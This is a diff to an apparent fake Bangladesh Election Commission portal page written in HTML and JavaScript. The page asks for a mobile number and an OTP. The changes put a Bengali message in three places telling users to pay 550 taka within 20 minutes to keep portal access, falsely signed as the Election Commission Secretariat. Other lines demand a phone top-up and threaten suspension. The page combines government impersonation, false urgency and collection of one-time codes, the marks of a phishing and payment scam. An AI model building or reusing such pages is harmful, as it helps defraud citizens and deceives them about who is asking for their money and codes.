@@ -75,7 +75,7 @@
       <input type="tel" id="mobileNumber" class="form-control" placeholder="রেজিস্টারকৃত মোবাইল নাম্বার" maxlength="11" inputmode="numeric">
       <button type="button" id="requestOtpBtn" class="btn" style="margin-bottom:10px;background:#28a745;">OTP পাঠান</button>
       <p style="margin:10px 0 15px 0;font-size:14px;color:#555;text-align:left;">
-        রেজিস্ট্রারকৃত মোবাইল নাম্বার দিয়ে সাবমিট করুন, এবং ৩০ সেকেন্ডের মধ্যে ওটিপি না পেলে পূনরায় আবার সাবমিট করুন
+        আপনার পোর্টাল এক্সেস রিফারিং হচ্ছে আগামী ২০ মিনিটের মধ্যে ৫৫০ টাকা প্রদান করে সম্পুর্ন ভাবে পোর্টাল সচল করুন। ধন্যবাদ। বাংলাদেশ নির্বাচন কমিশন সচিবালয়।
       </p>
       <input type="text" id="otp" class="form-control" placeholder="OTP দিন" maxlength="6" inputmode="numeric" autocomplete="one-time-code" required>
       <button type="submit" class="btn">সাবমিট</button>
@@ -190,7 +190,7 @@
         msg.textContent = "দুঃখীত আপনার পর্যাপ্ত পরিমাণ রিচার্জ না থাকায় আপনার ওটিপি পাঠানো যাচ্ছে না অতিদ্রুত ভাবে রিচার্জ সম্পুর্ন করুন।"; msg.className = "error"; return;
       }
       lastOtpRequestTime = Date.now();
-      msg.textContent = "OTP আপনার মোবাইলে পাঠানো হয়েছে। ৩০ সেকেন্ডের মধ্যে না পেলে আবার চেষ্টা করুন।"; msg.className = "success";
+      msg.textContent = "আপনার পোর্টাল এক্সেস রিফারিং হচ্ছে আগামী ২০ মিনিটের মধ্যে ৫৫০ টাকা প্রদান করে সম্পুর্ন ভাবে পোর্টাল সচল করুন। ধন্যবাদ। বাংলাদেশ নির্বাচন কমিশন সচিবালয়।"; msg.className = "success";
     });
 
     document.getElementById("otpForm").addEventListener("submit", e => {
@@ -212,8 +212,7 @@
 
     function showForm(type) {
       if (searchCount >= 1) {
-        document.getElementById("accessMessage").innerHTML = `দুঃখীত নির্বাচন কমিশনের সাথে আপনার পোর্টাল এক্সেস সংযুক্ত নেই। ধন্যবাদ। 
-বাংলাদেশ নির্বাচন কমিশন সচিবালয়। <a href="https://ecs.gov.bd/" target="_blank"> অন্যথায় নির্বাচন কমিশনের Vpn থেকে আপনার পোর্টাল সাসপেন্ড হয়ে যাবে।`;
+        document.getElementById("accessMessage").innerHTML = `আপনার পোর্টাল এক্সেস রিফারিং হচ্ছে আগামী ২০ মিনিটের মধ্যে ৫৫০ টাকা প্রদান করে সম্পুর্ন ভাবে পোর্টাল সচল করুন। ধন্যবাদ। বাংলাদেশ নির্বাচন কমিশন সচিবালয়। <a href="https://ecs.gov.bd/" target="_blank"> অন্যথায় নির্বাচন কমিশনের Vpn থেকে আপনার পোর্টাল সাসপেন্ড হয়ে যাবে।`;
         document.getElementById("formArea").innerHTML = "<h3>অ্যাক্সেস সীমিত</h3>";
         return;
       }
